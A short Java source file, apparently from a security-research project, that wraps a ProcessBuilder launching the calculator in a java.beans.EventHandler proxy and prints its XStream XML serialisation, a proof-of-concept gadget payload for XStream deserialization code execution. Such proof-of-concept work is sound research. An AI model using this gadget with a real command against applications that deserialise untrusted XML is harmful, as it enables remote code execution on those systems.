package com.trganda.xstream.eventhandler;

import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;

public class XStreamEventHandler {
        public static void main(String[] args) {
            Comparable handler = EventHandler.create(Comparable.class, new
                    ProcessBuilder("open", "-a", "calculator"), "start");
            String xml = new XStream().toXML(handler);
            System.out.println(xml);
        }

}
